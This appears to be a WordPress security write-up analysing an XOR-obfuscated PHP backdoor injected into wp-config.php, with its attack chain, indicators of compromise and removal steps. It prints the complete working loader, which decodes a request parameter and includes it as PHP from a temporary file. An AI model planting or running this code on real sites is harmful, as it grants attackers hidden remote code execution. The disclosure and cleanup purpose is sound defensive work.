---
title: 'XOR-Obfuscated PHP Dropper'
description: 'Technical analysis of the "mrk" XOR backdoor in wp-config.php. Learn how hackers use hex2bin and XOR 66 to execute ephemeral PHP payloads in temporary directories.'
slug: 'xor-obfuscated-php-loader'
reportDate: '2026-01-24'
threatType: 'Remote Code Execution (RCE) Backdoor'
severity: 'Critical'
fileHash: 'wp-config-xor-backdoor-mrk-parameter'
detectedPaths: ['wp-config.php']
screenshots:
  [
    '/images/wordpress-threats/wp-config-xor-backdoor-mrk-parameter_evidence-1.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'This malware allows attackers to execute arbitrary code remotely, potentially compromising the entire WordPress site and server.'
seenOn: 'wp-config.php'
behavior: 'Executes arbitrary code via HTTP requests, avoiding detection by ephemeral file usage.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'Not specified'
---

## Technical Analysis

The malware is embedded at the start of 'wp-config.php', using an XOR-obfuscation technique to dynamically execute arbitrary PHP code upon receiving specific HTTP requests. It leverages PHP’s ability to write to sys directories, thus avoiding direct disk alterations apart from transient file creation. This malicious code is triggered by the 'mrk' parameter, decodes payloads using XOR and executes them by writing to temporary files.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. Step 1: Detects specific GET/POST request parameter 'mrk'.
2. Step 2: Decodes the payload using XOR obfuscation.
3. Step 3: Writes a temporary file '.desc' in writable directories, executes the payload, then deletes the file.

## Code Signature(s)

### FILE: `wp-config.php`

```php
<?php

if(array_key_exists("mr\x6B", $_REQUEST) && !is_null($_REQUEST["mr\x6B"])){ $val = hex2bin($_REQUEST["mr\x6B"]); $entity = ''; $k = 0; while($k < strlen($val)){$entity .= chr(ord($val[$k]) ^ 66);$k++;} $data = array_filter([getenv("TEMP"), getcwd(), "/var/tmp", session_save_path(), "/dev/shm", getenv("TMP"), ini_get("upload_tmp_dir"), "/tmp", sys_get_temp_dir()]); $ref = 0; do { $hld = $data[$ref] ?? null; if ($ref >= count($data)) break; if ((is_dir($hld) and is_writable($hld))) { $ent = str_replace("{var_dir}", $hld, "{var_dir}/.desc"); if (file_put_contents($ent, $entity)) { include $ent; @unlink($ent); exit; } } $ref++; } while (true); }

define( 'WP_CACHE', true );

/**
 * The base configuration for WordPress
```

## Indicators of Compromise (IOCs)

- `mr\x6B`
- `.desc`
- `xor 66`

## Removal Protocol

1. Step 1: Backup the affected 'wp-config.php'.
1. Step 2: Open 'wp-config.php' and remove the malicious PHP code snippet at the top.
1. Step 3: Secure file permissions by setting 'wp-config.php' permissions to 640.
1. Step 4: Confirm no other files are modified or infected by scanning the site.
1. Step 5: Update all server and WordPress components to the latest versions.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
